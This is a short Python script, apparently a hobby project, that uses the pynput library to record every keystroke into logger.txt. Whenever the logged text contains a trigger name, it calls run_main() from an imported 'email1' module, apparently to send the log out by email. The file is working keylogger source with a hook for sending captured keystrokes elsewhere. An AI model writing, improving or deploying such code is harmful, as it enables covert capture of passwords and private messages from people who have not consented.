import pynput

from pynput.keyboard import Key, Listener
from email1 import run_main

count = 0
keys = []

def when_pressed(key): 
    global keys, count
    keys.append(key)
    count += 1
    print('{} was clicked'.format(key))

    if count >= 10: 
        count = 0
        write_file(keys)
        scan_txt()
        keys = []


def when_released(key): 
    if key == Key.esc: 
        return False

def scan_txt():
    file = open("logger.txt", "r")
    read = file.readlines()
    file.close()

    for sentence in read: 
        line = sentence.split()
        for word in line: 
            line2 = word.lower()
            line2 = line2.strip("!@#$%^&*()_+=")
            if "avaneesh" == line2: 
                run_main()

def write_file(keys): 
    with open("logger.txt", "a") as logger: 
        for key in keys: 
            # removes unnessesary quotation marks
            replaced = str(key).replace("'", "")
            if replaced.find("space") > 0: 
                logger.write('\n')

            elif replaced.find("Key") == -1: 
                logger.write(replaced)




with Listener(on_press=when_pressed, on_release=when_released) as listener:
    listener.join()


